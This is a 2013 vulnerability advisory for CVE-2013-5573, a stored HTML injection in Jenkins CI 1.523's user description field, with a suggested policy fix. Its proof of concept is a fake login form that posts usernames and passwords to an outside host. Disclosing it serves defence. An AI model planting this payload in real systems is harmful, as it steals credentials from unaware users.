Date published : 2013-12-16
Date of last update: 2013-12-16
Vendors contacted : Jenkins CI v 1.523
Discovered by: Christian Catalano
Severity: Low


02. ###  Vulnerability Information ###

CVE reference: CVE-2013-5573
CVSS v2 Base Score: 4.7
CVSS v2 Vector : (AV:N/AC:L/Au:M/C:P/I:P/A:N)
Component/s : Jenkins CI v 1.523
Class : HTML Injection


03. ### Introduction ###

Jenkins CI is an extendable open source continuous integration server
http://jenkins-ci.org.


04. ### Vulnerability Description ###

The default installation and configuration of Jenkins CI is prone to a
security vulnerability. The Jenkins CI default markup formatter permits
offsite-bound forms. This vulnerability could be exploited by a remote
attacker (a malicious user) to inject malicious persistent HTML script
code (application side).


05. ### Technical Description / Proof of Concept Code ###

The vulnerability is located in the 'Descriotion' input field of the
User Configuration  function:

https://localhost:9444/jenkins/user/attacker/configure

To reproduce the vulnerability,  the attacker (a malicious user) can add
the malicious HTML script code:

<form method="POST" action="http://www.mocksite.org/login/login.php.">
Username: <input type="text" name="username" size="15" /><br />
Password: <input type="password" name="passwort" size="15" /><br />
<div align="center">
<p><input type="submit" value="Login" /></p>
</div>
</form>

in the 'Descriotion' input field and click on save button.
The code execution happens when the victim (an unaware user) view the
'People List'

https://localhost:9444/jenkins/asynchPeople/

and click on attacker user id.


06. ### Business Impact ###

Exploitation of the persistent web vulnerability requires a low
privilege web application user account.
Successful exploitation of the vulnerability results in persistent
phishing and persistent external redirects.


07. ### Systems Affected ###


This vulnerability was tested against:
Jenkins CI v1.523
Older versions are probably affected too, but they were not checked.


08. ### Vendor Information, Solutions and Workarounds ###

Currently, there are no known upgrades or patches to correct this
vulnerability. It is possible to temporarily mitigate the flaw by
implementing the following workaround:
'MyspacePolicy' permits
tag("form", "action", ONSITE_OR_OFFSITE_URL,
             "method");

Fix 'MyspacePolicy' by restricting the policy to ONSITE_URL only or
perhaps <form> could be banned entirely.
